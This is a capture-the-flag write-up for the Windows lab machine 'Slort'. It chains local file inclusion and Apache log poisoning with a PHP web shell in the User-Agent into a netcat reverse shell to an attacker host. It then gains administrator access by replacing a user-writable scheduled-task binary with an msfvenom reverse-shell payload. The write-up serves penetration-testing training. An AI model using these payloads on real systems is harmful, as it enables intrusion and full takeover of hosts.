# Slort - Proving Grounds Practice

> **Kill Chain Summary**: Directory enumeration identifies /site/ on Port 8080 -> LFI vulnerability discovered on ?page= parameter -> Apache access log poisoning (C:\xampp\apache\logs\access.log) via User-Agent -> Reverse shell as rupert -> File enumeration reveals automated backup task in C:\Backup -> Modifiable binary (TFTP.EXE) with Full Control permissions for Users -> Scheduled binary replacement -> Administrator Shell.

| Property | Value |
|---|---|
| **Target Name** | Slort |
| **Platform** | Proving Grounds Practice |
| **OS** | Windows 10 (Build 19042) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Directory Fuzzing, Windows XAMPP Local File Inclusion (LFI), Apache Log Poisoning, Scheduled Task Hijacking (Weak Binary Permissions) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/allports
```

**Open Ports Summary:**
```text
PORT      STATE SERVICE
21/tcp    open  ftp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
4443/tcp  open  pharos
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8080/tcp  open  http-proxy
```

---

### 1.2 Web Enumeration (Port 8080)

Browsing to `http://$IP:8080/` displays a default XAMPP landing page:

![Screenshot](../../attachments/Pasted%20image%2020260828094249.png)

Running directory fuzzing with `gobuster`:

```bash
gobuster dir -u http://$IP:8080/ -w /usr/share/wordlists/dirb/common.txt
```

**Discovery:**
```text
/dashboard            (Status: 301)
/site                 (Status: 301) [--> http://192.168.x.x:8080/site/]
```

Navigating to `/site/` reveals an interactive web application:

![Screenshot](../../attachments/Screenshot%20From%202026-08-28%2009-56-12.png)

The URL structure uses a query parameter to load sub-pages:
```text
http://192.168.x.x:8080/site/index.php?page=main.php
```

---

## 2. Initial Access

### 2.1 Local File Inclusion (LFI) Discovery

We test the `page` parameter for directory traversal against standard Windows system files:

```text
http://192.168.x.x:8080/site/index.php?page=../../../../../../../../windows/System32/drivers/etc/hosts
```

![Screenshot](../../attachments/Pasted%20image%2020260828095715.png)

The contents of the Windows `hosts` file are rendered into the page, confirming unauthenticated LFI.

---

### 2.2 Apache Log Poisoning on Windows (XAMPP)

In default XAMPP installations on Windows, Apache access logs reside at `C:\xampp\apache\logs\access.log`.

#### Step 1: Injecting PHP Code into Access Log
We send a request to port 8080 with a PHP command shell inside the `User-Agent` header using Burp Suite:

```http
GET /site/index.php?page=../../../../../../../../xampp/apache/logs/access.log HTTP/1.1
Host: 192.168.x.x:8080
User-Agent: <?php system($_GET['cmd']); ?>
Connection: close
```

#### Step 2: Validating Code Execution
Verify remote command execution by making a request to our listener on Kali:

```text
http://192.168.x.x:8080/site/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=curl%20http%3A%2F%2FKALI_IP
```

The web server on Kali receives the incoming request, confirming operational RCE.

---

### 2.3 Reverse Shell and User Flag

1. Host `nc.exe` via an SMB share on Kali:
   ```bash
   impacket-smbserver share $(pwd) -smb2support
   ```

2. Transfer `nc.exe` to the target via the web shell:
   ```text
   http://192.168.x.x:8080/site/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=copy%20%5C%5CKALI_IP%5Cshare%5Cnc.exe%20.
   ```

3. Start a Netcat listener on port 80:
   ```bash
   sudo nc -lvnp 80
   ```

4. Trigger the reverse shell:
   ```text
   http://192.168.x.x:8080/site/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=nc.exe%20KALI_IP%2080%20-e%20cmd.exe
   ```

Connection received:
```cmd
Microsoft Windows [Version 10.0.19042.1387]
C:\xampp\htdocs\site> whoami
slort\rupert
```

Checking user flag:
```cmd
type C:\Users\rupert\Desktop\local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Internal File Enumeration: Scheduled Task in `C:\Backup`

Manual enumeration of the filesystem root reveals a non-standard folder: `C:\Backup`.

```cmd
dir C:\Backup
# 06/12/2020  07:45 AM            11,304 backup.txt
# 06/12/2020  07:45 AM                73 info.txt
# 06/23/2020  07:49 PM            73,802 TFTP.EXE
```

Inspecting `info.txt`:

```cmd
type C:\Backup\info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```

A scheduled task executes `C:\Backup\TFTP.EXE` every 5 minutes.

---

### 3.2 Auditing Binary Permissions

Checking NTFS permissions on `TFTP.EXE` with `icacls`:

```cmd
icacls C:\Backup\TFTP.EXE
```

```text
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
```

Standard `Users` have **Full Control (F)** over `TFTP.EXE`.

---

### 3.3 Binary Replacement and Administrator Shell

We compile a 64-bit reverse shell payload and replace `TFTP.EXE`:

1. Generate reverse shell executable on Kali:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o TFTP.EXE
   ```

2. Start a Netcat listener on port 4444:
   ```bash
   sudo nc -lvnp 4444
   ```

3. Overwrite `TFTP.EXE` over SMB from the target prompt:
   ```cmd
   cd C:\Backup
   copy \\KALI_IP\share\TFTP.EXE . /Y
   ```

Within 5 minutes, the automated scheduled task executes our binary with elevated privileges:

```cmd
listening on [any] 4444 ...
connect to [KALI_IP] from [192.168.x.x]
Microsoft Windows [Version 10.0.19042.1387]

C:\WINDOWS\system32> whoami
slort\administrator
```

Checking root flag:
```cmd
type C:\Users\Administrator\Desktop\proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Windows XAMPP Default Log Poisoning Path
GET /path/index.php?page=../../../../../../../../xampp/apache/logs/access.log

# Check file permissions on Windows
icacls C:\TargetFolder\binary.exe

# Copy executable over SMB
copy \\KALI_IP\share\payload.exe C:\TargetFolder\target.exe /Y
```

---

## 5. Key Takeaways and Lessons Learned

1. **Windows LFI to Log Poisoning:** On Windows servers running XAMPP or WAMP, default access log paths are well known (`C:\xampp\apache\logs\access.log`). The poisoning methodology is identical to Linux environments: inject PHP via headers and include the log.
2. **Prioritize Manual Inspection over Tools:** Automated scanners (such as WinPEAS) can generate excessive output that obscures simple, high-value misconfigurations. Checking custom directories in `C:\` (such as `C:\Backup`, `C:\Tools`, `C:\Scripts`) often reveals scheduled tasks with weak permissions.
3. **Weak Binary Permissions on Scheduled Tasks:** If a scheduled task or service runs with administrative privileges and its underlying binary has write/modify permissions granted to `BUILTIN\Users`, replacing the executable provides a deterministic route to administrator access.

---

### Tags
#windows #xampp #lfi #log-poisoning #rce #scheduled-task #weak-permissions #privesc #medium #pg-practice #rooted
